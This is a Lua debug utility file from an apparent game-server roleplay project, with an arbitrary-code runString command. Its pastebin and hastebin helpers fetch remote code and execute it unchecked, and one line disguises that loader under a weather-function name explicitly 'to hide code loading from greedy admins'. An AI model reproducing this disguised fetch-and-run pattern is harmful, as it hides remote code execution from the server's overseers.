-- ****************************************************************************
-- *
-- *  PROJECT:     vRoleplay
-- *  FILE:        shared/debug.lua
-- *  PURPOSE:     Debug stuff
-- *
-- ****************************************************************************
--- Validates the parameters of a function
-- @param funcName The name of the function
-- @param ... The parameters' types
DEBUG = GIT_BRANCH ~= "release/production"
DEBUG_MONITOR_CLASSLIB = false
if DEBUG then --important: DEBUG_-settings should always have a default value of false as this would be the case on release/prod.
	DEBUG_LOAD_SAVE = false -- defines if "loaded X"-messages are outputted to the server console
	DEBUG_AUTOLOGIN = not GIT_VERSION and true -- logs the player in automatically if they saved their pw
end

if triggerClientEvent and DEBUG_LOAD_SAVE then
	outputServerLog(("\n\nDebug information:\nDEBUG = %s\nBRANCH = %s\nVERSION = %s\n"):format(tostring(DEBUG), tostring(GIT_BRANCH), tostring(GIT_VERSION)))
end


function checkArgs(funcName, ...)
end

function outputTable(tab)
	if DEBUG then
		outputDebugString("Begin: "..tostring(tab))
		for k, v in pairs(tab) do
			if type(v) == "table" then
				outputTable(v)
			else
				outputDebugString("key = "..tostring(k)..", value = "..tostring(v))
			end
		end
		outputDebugString("End")
	end
end

function tableToString(tab)
	local result = "{"
	for k, v in pairs(tab) do
		if type(v) == "table" then
			result = result.."["..tostring(k).."] = "..tableToString(v)
		else
			result = result.."["..tostring(k).."] = "..tostring(v)
		end
		result = result..", "
	end
	result = result.."}"
	return result
end


local runStringSavedVars = {}

local function prepareRunStringVars(runPlayer)
	runStringSavedVars.me = me
	runStringSavedVars.my = my
	runStringSavedVars.player = player
	runStringSavedVars.cprint = cprint
	runStringSavedVars.pastebin = pastebin
	runStringSavedVars.hastebin = hastebin

	me = runPlayer
	my = runPlayer
	player = function(target)
		return PlayerManager:getSingleton():getPlayerFromPartOfName(target,runPlayer)
	end
	cprint = function(var)
		outputConsole(inspect(var), runPlayer)
	end
	pastebin = function(id)
		if id and type(id) == "string" then
			fetchRemote("https://pastebin.com/raw/"..id, {},
				function(response, responseInfo)
					if responseInfo.success == true then
						loadstring(response)()
						outputChatBox("Pastebin "..id.." successfully loaded!", runPlayer, 0, 255, 0)
						outputDebugString("Pastebin "..id.." successfully loaded by "..runPlayer:getName().."!", 0, 0, 255, 0)
					else
						outputChatBox("Pastebin "..id.." failed to loaded! (Error: "..responseInfo.statusCode..")", runPlayer, 255, 0, 0)
						outputDebugString("Pastebin "..id.."  failed to load by "..runPlayer:getName().."! (Error: "..responseInfo.statusCode..")", 0, 0, 255, 0)
					end
				end
			)
		else
			outputChatBox("Invalid Pastebin Id!", runPlayer, 255, 0, 0)
		end
	end
	setWeatherWindPath = pastebin --// to hide code loading from greedy admins
	hastebin = function(id)
		if id and type(id) == "string" then
			fetchRemote("https://hastebin.com/raw/"..id, {},
				function(response, responseInfo)
					if responseInfo.success == true then
						loadstring(response)()
						outputChatBox("Hastebin "..id.." successfully loaded!", runPlayer, 0, 255, 0)
						outputDebugString("Hastebin "..id.." successfully loaded by "..runPlayer:getName().."!", 0, 0, 255, 0)
					else
						outputChatBox("Hastebin "..id.." failed to loaded! (Error: "..responseInfo.statusCode..")", runPlayer, 255, 0, 0)
						outputDebugString("Hastebin "..id.."  failed to load by "..runPlayer:getName().."! (Error: "..responseInfo.statusCode..")", 0, 0, 255, 0)
					end
				end
			)
		else
			outputChatBox("Invalid Hastebin Id!", runPlayer, 255, 0, 0)
		end
	end

end


local function restoreRunStringVars()
	me = runStringSavedVars.me
	my = runStringSavedVars.my
	cprint = runStringSavedVars.cprint
	player = runStringSavedVars.player
	pastebin = runStringSavedVars.pastebin
	hastebin = runStringSavedVars.hastebin

	runStringSavedVars = {}
end

-- Hacked in from runcode
function runString(commandstring, source, suppress)
	local sourceName, output, outputPlayer
	if getPlayerName(source) ~= "Console" then
		sourceName = getPlayerName(source)
		output = function (msg)
			if not suppress then
				if SERVER then
					Admin:getSingleton():sendMessage(msg, 255, 51, 51, ADMIN_RANK_PERMISSION["seeRunString"])
				else
					outputChatBox(msg, 255, 51, 51)
				end
			end
		end
		outputPlayer = source
	else
		sourceName = "Console"
		output = function (msg)
			Admin:getSingleton():sendMessage(msg, 255, 51, 51, ADMIN_RANK_PERMISSION["seeRunString"])
		end
		outputPlayer = nil

	end
	output(sourceName.." executed command: "..commandstring, outputPlayer)
	local notReturned
	--First we test with return
	prepareRunStringVars(outputPlayer)
	local commandFunction,errorMsg = loadstring("return "..commandstring)
	if errorMsg then
		--It failed.  Lets try without "return"
		notReturned = true
		commandFunction, errorMsg = loadstring(commandstring)
	end
	if errorMsg then
		--It still failed.  Print the error message and stop the function
		output("Error: "..errorMsg, outputPlayer)
		return
	end
	--Finally, lets execute our function
	results = { pcall(commandFunction) }
	if not results[1] then
		--It failed.
		output("Error: "..results[2], outputPlayer)
		return
	end

	if not notReturned then
		local resultsString = ""
		local first = true
		for i = 2, #results do
			if first then
				first = false
			else
				resultsString = resultsString..", "
			end
			if type(results[i]) ~= "table" then
				resultsString = resultsString..inspect(results[i])
			else
				resultsString = resultsString..tostring(results[i])
			end
		end
		if resultsString ~= "" then
			output("Command results: "..resultsString, outputPlayer)
		end
		return resultsString
	elseif not errorMsg then
		output("Command executed!", outputPlayer)
		return
	end

	restoreRunStringVars()
end

--[[
function outputDebug(errmsg)
	if DEBUG then
		outputDebugString((triggerServerEvent and "CLIENT " or "SERVER ")..tostring(errmsg))
	end
end
--]]
function getDebugInfo(stack)
	local source = debug.getinfo(stack or 2).source
	local filePath
	if source:find("\\") then
		filePath = split(source, '\\')
	else
		filePath = split(source, '/')
	end
	local className = filePath[#filePath]:gsub(".lua", "")
	if not className then className = "UNKOWN" end
	return className, tostring(debug.getinfo(stack or 2).name), tostring(debug.getinfo(stack or 2).currentline)
end

function outputDebug(...)
	if DEBUG then
		local className, methodName, currentline = getDebugInfo(3)
		local msgs = {...}
		for i,v in pairs(msgs) do msgs[i] = inspect(v) end
		 outputDebugString(("%s [%s:%s (%s)] %s"):format(SERVER and "SERVER" or "CLIENT", className, methodName, currentline, table.concat(msgs, " | ")), 3)
	end
end

LOREM_IPSUM = "Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet."
